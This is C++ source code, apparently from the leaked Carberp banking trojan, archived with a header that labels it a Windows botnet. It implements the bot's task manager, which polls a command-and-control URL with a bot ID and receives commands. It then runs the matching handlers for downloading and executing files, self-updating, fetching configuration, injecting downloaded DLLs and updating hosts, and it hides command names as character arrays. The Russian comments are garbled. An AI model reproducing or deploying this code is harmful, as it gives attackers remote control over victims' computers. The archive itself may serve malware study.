/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
#include <windows.h>

#include "Task.h"
#include "Memory.h"
#include "Strings.h"
#include "Loader.h"
#include "BotUtils.h"
#include "GetApi.h"
#include "BotClasses.h"
#include "Config.h"
#include "Utils.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotHosts.h"

#include "Modules.h"

//---------------------------------------------------------------------------
// ������� ������ ���������� ����������
//#include "BotDebug.h"

namespace TASKDBGTEMPLATES
{
    #include "DbgTemplates.h"
}

#define TASKDBG TASKDBGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

typedef struct TTaskManager
{
	PCHAR URL;                  // ����� ������ ����� ������� �������
	DWORD Interval;             // �������� ��������� ������ (�����������);
	LPCRITICAL_SECTION Lock;    // ������ ������������
	PList RegisteredCommands;   // ������ ������������������ ������
	HANDLE CommandsThread;      // ����� ����������� ���������� ������
	HANDLE CommandEvent;        // ������� ���������� ����� ������� � ������
	PList CommandsList;         // ������ ������ ��������� ����������
	bool Terminated;            // ������� ���������� ������

} *PTASKMANAGER;


typedef struct TRegisteredCommand
{
   PCHAR Name;
   TCommandMethod Method;
} *PRegisteredCommand;

typedef struct TCommand
{
	PCHAR Command;
    PCHAR Args;
} *PCommand;


// ���������� ������� �����
//HANDLE GLManagerPID = NULL;
PTaskManager GlobalTaskManager = NULL;
DWORD TaslManagerProcess = 0;

//---------------------------------------------------------------------------
PTaskManager GetGlobalTaskManager(bool Initialize)
{
	// ���������� ��������� �� ���������� �������� �����
	if (IsNewProcess(TaslManagerProcess))
		GlobalTaskManager = NULL;

	if (GlobalTaskManager == NULL && Initialize)
        InitializeTaskManager(NULL, true);

	return GlobalTaskManager;
}

//---------------------------------------------------------------------------

void FreeCommand(LPVOID C)
{
	STR::Free(PCommand(C)->Command);
	STR::Free(PCommand(C)->Args);
    FreeStruct(C);
}
//----------------------------------------------------------------------------

void FreeRegisteredCommand(LPVOID C)
{
	STR::Free(PRegisteredCommand(C)->Name);
    FreeStruct(C);
}
//----------------------------------------------------------------------------


bool InitializeTaskManager(PTaskManager *Manager, bool RegisterCommands)
{
	// ������� �������� ������
	PTASKMANAGER M = CreateStruct(TTaskManager);
	if (M == NULL)
		return false;

	M->Lock = CreateStruct(RTL_CRITICAL_SECTION);
	pInitializeCriticalSection(M->Lock);

	if (Manager == NULL)
        Manager = &GlobalTaskManager;

	*Manager = (PTaskManager)M;

	if (RegisterCommands)
		RegisterAllCommands(*Manager, COMMAND_ALL);

	return true;
}

//----------------------------------------------------------------------------

void FreeTaskManager(PTaskManager Manager)
{
	// ���������� �������� �����
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
	{
		M = (PTASKMANAGER)GetGlobalTaskManager(false);
		GlobalTaskManager = NULL;
	}

	if (M == NULL) return;


    StopTaskManager(Manager);
	pDeleteCriticalSection(M->Lock);
	FreeStruct(M->Lock);
    FreeStruct(M);
}

//----------------------------------------------------------------------------
PRegisteredCommand GetRegisteredCommand(PTASKMANAGER M, PCHAR CommandName)
{
	// ���� ������� �� �����
    PRegisteredCommand C;
	DWORD Count = List::Count(M->RegisteredCommands);
	for (DWORD i = 0; i < Count; i++)
	{
		C = (PRegisteredCommand)List::GetItem(M->RegisteredCommands, i);
		if (StrSame(C->Name, CommandName, false))
			return C;
	}

	return NULL;
}

//----------------------------------------------------------------------------
bool RegisterCommand(PTaskManager Manager, PCHAR CommandName, TCommandMethod Method)
{
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);

	if (M == NULL || STR::IsEmpty(CommandName) || Method == NULL ||
		GetRegisteredCommand(M, CommandName) != NULL)
		return false;


	// ������ �������� �������
	pEnterCriticalSection(M->Lock);

	if (M->RegisteredCommands == NULL)
	{
		M->RegisteredCommands = List::Create();
		List::SetFreeItemMehod(M->RegisteredCommands, FreeRegisteredCommand);
    }

	PRegisteredCommand C = CreateStruct(TRegisteredCommand);
	if (C != NULL)
	{
		C->Name = STR::New(CommandName);
		C->Method = Method;
    }
    List::Add(M->RegisteredCommands, C);

	pLeaveCriticalSection(M->Lock);

	return C != NULL;
}
//----------------------------------------------------------------------------

DWORD WINAPI ExecuteCommandsProc(LPVOID Data)
{
	// ��������� ������ ���������� �������
	PTASKMANAGER M = (PTASKMANAGER)Data;
	PCommand Command;
	do
	{
		// ������� �������
		pWaitForSingleObject(M->CommandEvent, INFINITE);

		if (!M->Terminated)
		{
            // �������� ��������� �������
			pEnterCriticalSection(M->Lock);

			Command = (PCommand)List::Extract(M->CommandsList, 0);
			// � ������ ���� ������ ������ ���������� �������
			if (List::Count(M->CommandsList) == 0)
				pResetEvent(M->CommandEvent);

			pLeaveCriticalSection(M->Lock);

			// ��������� �������
			ExecuteCommand(NULL, Command->Command, Command->Args, false);

			FreeCommand(Command);
        }
	}
	while (!M->Terminated);
	pExitThread(0);
    return 0;
}

//----------------------------------------------------------------------------

void CreateTaskThread(PTASKMANAGER M)
{
	// ������� ����������� ������ ��� ����������� ���������� ������
	if (M->CommandsThread != NULL)
		return;
	M->CommandsList = List::Create();
	List::SetFreeItemMehod(M->CommandsList, FreeCommand);
	M->CommandEvent = pCreateEventA(NULL, true, false, NULL);
	M->CommandsThread = pCreateThread(NULL, 512, ExecuteCommandsProc, M, 0, NULL);
}
//----------------------------------------------------------------------------

bool TaskManagerSleep(PTaskManager Manager)
{
	// ������� �� ����������� ��������
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(false);
	if (M == NULL || M->Terminated)
		return false;

	// ���������� ��������
	DWORD Interval = M->Interval;

	if (Interval == 0)
		Interval = GetDelay() * 60 * 1000;

	if (Interval == 0)
		Interval = 60*1000;

	// ����
	DWORD SleepTime = 0;
	while (SleepTime < Interval && !M->Terminated)
	{
		pSleep(1000);
        SleepTime += 1000;
	}

    return !M->Terminated;
}

//----------------------------------------------------------------------------

bool StartTaskManager(PTaskManager Manager, PCHAR URL, bool InitCommands)
{
	/*   ��������� ���� ��������� ������  */

	// �������������� �������� ���������� ������
	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// ������������ ��������� �������
	if (InitCommands)
		RegisterAllCommands(M, COMMAND_ALL);

	PCHAR RealURL = URL;
	bool SelfURL = URL == NULL;
	
	// ��������� ���� ���������
	do
	{
		if (SelfURL)
			RealURL = GetBotScriptURL(SCRIPT_TASK);

		// ��������� � ��������� �������
		if (RealURL != NULL)
			DownloadAndExecuteCommand(M, RealURL);

		if (SelfURL)
			STR::Free(RealURL);
		// ���� �� ���������� ��������� �������
		if (!M->Terminated)
	        TaskManagerSleep(M);


	}
	while (!M->Terminated);
	return true;
}

//----------------------------------------------------------------------------

void StopTaskManager(PTaskManager Manager)
{
	// �������� ������ ��������� �����
	if (Manager == NULL)
		Manager = GetGlobalTaskManager(false);
	if (Manager == NULL) return;

	PTASKMANAGER M = (PTASKMANAGER)Manager;
	pEnterCriticalSection(M->Lock);

	if (M->CommandsThread)
	{
		// ����� ��������, �������������
		M->Terminated = true;
		pSetEvent(M->CommandEvent);
		pWaitForSingleObject(M->CommandsThread, 1000);

		pCloseHandle(M->CommandEvent);
		pCloseHandle(M->CommandsThread);
		List::Free(M->CommandsList);

		M->CommandEvent = NULL;
		M->CommandsThread = NULL;
		M->CommandsList = NULL;
	}

	pLeaveCriticalSection(M->Lock);
}
//----------------------------------------------------------------------------

bool DownloadCommand(PCHAR URL, PCHAR Password, PCHAR *HTMLCode)
{
	// ��������� �������/ ����� ������

	if (STR::IsEmpty(URL))
		return false;

	PCHAR BotID = GenerateBotID();
	TASKDBG("Task", "��������� �������: \r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "id", BotID);

	THTTPResponse Response;
	ClearStruct(Response);

	#ifdef CryptHTTPH
		bool Result = CryptHTTP::Post(URL, Password, Fields, HTMLCode, &Response);
	#else
    	bool Result = HTTP::Post(URL, Fields, HTMLCode, &Response);
	#endif

	if (Result)
	{
		TASKDBG("Task", "�������� ���������. ��� ������ [%d]", Response.Code);

		if (HTMLCode != NULL && Response.Code != 200)
		{
			TASKDBG("Task", "��������� �������:\r\n %s", HTMLCode);
			STR::Free(*HTMLCode);
			*HTMLCode = NULL;
		}
	}
	else
		TASKDBG("Task", "������ �������� ���������");

    HTTPResponse::Clear(&Response);
	STR::Free(BotID);
	Strings::Free(Fields);
    return Result;
}
//----------------------------------------------------------------------------

bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
{
	// ��������� � ��������� �������
	if (URL == NULL)
		return false;

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// ��������� �������
	PCHAR Command = NULL;
	bool Result = false;

	PCHAR Password = NULL;
	#ifdef CryptHTTPH
		Password = GetMainPassword();
	#endif

	if (DownloadCommand(URL, Password, &Command))
	{
		if (Command != NULL)
		{
			Result = ExecuteCommand(M, Command);
			STR::Free(Command);
        }
	}
	STR::Free(Password);

    return Result;
}
//----------------------------------------------------------------------------

void DoAfterExecuteCommand(PTASKMANAGER Manager, PCHAR Command, PCHAR Args, bool Executed)
{
	// ������� ����������� �� ���������� �������
/* 	PCHAR  prefix;
	if (Executed)
		prefix = "���������";
	else
		prefix = "�� ���������";

    DbgMsg("task", 0, "%s %s ( %s )", prefix, Command, Args);*/
}
//---------------------------------------------------------------------------



bool InvalidChar(char c)
{
	return c == 10 ||
		   c == 13 ||
		   c == 9 ||
		   c == 32;
}

bool ParseCommand(PCHAR HTML, PCHAR &Command, PCHAR &Args)
{
	// ����������� HTML ������ �� ������� � ���������
	if (HTML == NULL)
		return false;

	Args = STR::GetRightStr(HTML, " ");

	if (Args != NULL)
	{
		Command = STR::GetLeftStr(HTML, " ");
		bool Changed = false;
		// �������� ������ �������
		DWORD Len = STR::Length(Args);
		PCHAR Tmp = Args + (Len - 1);
		while (Tmp != Args && InvalidChar(*Tmp))
		{
            *Tmp = 0;
			Tmp--;
			Changed = true;
		}
		if (Changed)
		{
			Tmp = Args;
			Args = STR::New(Tmp);
			STR::Free(Tmp);
		}
	}
	else
		Command = STR::New(HTML);
    return Command != NULL;
}
//---------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR HTML, bool Deferred)
{

	// ��c������� HTML � ��������� �������
	if (STR::IsEmpty(HTML))
		return false;

	PStrings S = Strings::Create();
	Strings::SetText(S, HTML);
	DWORD Count = Strings::Count(S);

	bool Res = false;
	PCHAR Command = NULL;
	PCHAR Args = NULL;
    PCHAR Line = NULL;

	for (DWORD i = 0; i < Count; i++)
	{
		Line = Strings::GetItem(S, i, false);
		//
		//  ������� ������������ � ������� ; ������������
		//
		if (!STR::IsEmpty(Line) && *Line != ';')
		{
			ParseCommand(Line, Command, Args);

			if (!STR::IsEmpty(Command))
				Res = Res | ExecuteCommand(Manager, Command, Args, Deferred);

			STR::Free2(Command);
			STR::Free2(Args);
        }
	}
	Strings::Free(S);

	return Res;
}

//---------------------------------------------------------------------------

bool ExecuteDeferredCommand(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// �������� ������� � ������ ����������� ���������� ��������� �����
	PTASKMANAGER M =(PTASKMANAGER)Manager;
	if (M == NULL || Command == NULL)
		return false;

	pEnterCriticalSection(M->Lock);

	// ��������� �����
	CreateTaskThread(M);

	// ������ �������� � ��������� � � ������
	PCommand C = CreateStruct(TCommand);
	C->Command = STR::New(Command);
	C->Args = STR::New(Args);

	List::Add(M->CommandsList, C);
	pSetEvent(M->CommandEvent);

	//
	pLeaveCriticalSection(M->Lock);

	return true;
}
//----------------------------------------------------------------------------

TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
//----------------------------------------------------------------------------

bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
{
	// ��������� ������� Command � ����������� Args
	// � ������ ���� Deferred == true ���������� ������� ����� ��������
	// � ����� ����������
	if (Command == NULL)
		return false;

	PTASKMANAGER M;
	if (Manager != NULL)
		M = (PTASKMANAGER)Manager;
	else
		M = (PTASKMANAGER)GetGlobalTaskManager(true);


	// ���������� ����� �������
	TCommandMethod Method = GetCommandMethod(M, Command);
	if (Method == NULL)
		return false;

    // ��������� ������� � ������ ���������� ������
	if (Deferred && M != NULL)
	{
		// ���������� �� ���������� ����������
		ExecuteDeferredCommand(M, Command, Args);
		return true;
    }

	// ��������� �������
   	bool Result = Method(M, Command, Args);

	// �������� ������� ���������� �������
	DoAfterExecuteCommand(M, Command, Args, Result);


	return Result;

}
//---------------------------------------------------------------------------


//--------------------------  ����������� ������ -------------------------//

bool ExecuteDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� � ��������� ����

	if (Args == NULL)
		return false;

	PWCHAR FileName = GetTempName();

	if ( FileName)
	{
		ExecuteFile(Args, FileName);
		MemFree(FileName);
		return true;
	}

	return false;
}


bool ExecuteUpdateConfig(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� ���������������� ����
	if (Args == NULL)
		return false;
	#ifdef BotConfigH
		return Config::Download(Args);
	#else
		return false;
	#endif
}

bool ExecuteUpdate(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� ����������
	bool Result = false;
	WCHAR *FileName = GetTempName();

	if (FileName)
	{
		if (DownloadInFile(Args, FileName ) && (DWORD)pGetFileAttributesW( FileName ) != INVALID_FILE_ATTRIBUTES )
			Result = MakeUpdate(FileName );
	}

	MemFree( FileName );
	return Result;
}

bool ExecuteLoadDLL(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ������� �� �������� ����������
	WCHAR *FileName = GetTempName();

	if (FileName == NULL)
		return false;

	bool Result = false;
	if ( DownloadInFile(Args, FileName ) && FileExistsW(FileName))
		Result = InjectDll(FileName );

	MemFree(FileName);
	return Result;
}


bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� ������������� �������� ������
	return false;

  /*		char * cPointer= m_strstr(&Buffer[1],"http:");
		if (LoadExe==NULL)
		{

			LoadExe = (char*)MemAlloc(m_lstrlen(cPointer))+1+4;
			m_lstrncpy(LoadExe,"exe=",4);
			m_lstrcat( LoadExe, cPointer );
		}
		else
		{
			LoadExe=(char*)MemRealloc(LoadExe,m_lstrlen(cPointer)+m_lstrlen(LoadExe)+1);
			m_lstrcat( LoadExe, cPointer );
		}

		char* cUrl=Buffer;
		char* cUrlNext;
		int i;
		char *DownloadUrl;
		while (true)
		{
			cUrl= m_strstr(&cUrl[1],"http:");
			if (cUrl==NULL)break;
			cUrlNext= m_strstr(cUrl,"|");
			i=m_lstrlen(cUrl)-m_lstrlen(cUrlNext);
			DownloadUrl = (char*)MemAlloc(i)+1;
			m_lstrncpy(DownloadUrl,cUrl,i);
			DownloadUrl[i]='\0';


			if ( DownloadUrl )
			{


				WCHAR *FileName =(WCHAR *)GetTempName();

				if ( FileName && DownloadUrl )
				{
					ExecuteFile( DownloadUrl, FileName );
				}

				MemFree( FileName );
			}

			MemFree( DownloadUrl );
		}
    */

}


bool ExecuteAlert(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	// ��������� ������� alert
	pMessageBoxA(0, Args, NULL, MB_OK | MB_ICONINFORMATION);
	return true;
}


//---------------------------------------------------------------------------


TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
{
    // ��������� ����������� �������

	const static char CommandUpdate[]        = {'u','p','d','a','t','e',0};
	const static char CommandUpdateConfig[]  = {'u','p','d','a','t','e','c','o','n','f','i','g' ,0};
	const static char CommandDownload[]      = {'d','o','w','n','l','o','a','d',0};
	const static char CommandLoadDll[]       = {'l','o','a','d','d','l','l',0};
	const static char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};
	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};

	int Index = StrIndexOf( Command, false, 6,
							(PCHAR)CommandUpdate,
							(PCHAR)CommandUpdateConfig,
							(PCHAR)CommandDownload,
							(PCHAR)CommandLoadDll,
							(PCHAR)CommandAlert,
							(PCHAR)CommandUpdateHosts);


	switch (Index)
	{
		case 0: return ExecuteUpdate;
		case 1: return ExecuteUpdateConfig;
		case 2: return ExecuteDownload;
		case 3: return ExecuteLoadDLL;
		case 4: return ExecuteAlert;
		case 5: return Hosts::ExecuteUpdateHostsCommand;

    default: ;
	}

	// ���� ������� � ������ ������������������
	if (Manager != NULL)
	{
		PRegisteredCommand Cmd = GetRegisteredCommand(Manager, Command);
		if (Cmd != NULL)
			return Cmd->Method;
	}

	return NULL;
}
//---------------------------------------------------------------------------




void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
{


	

}



//killos
//reboot
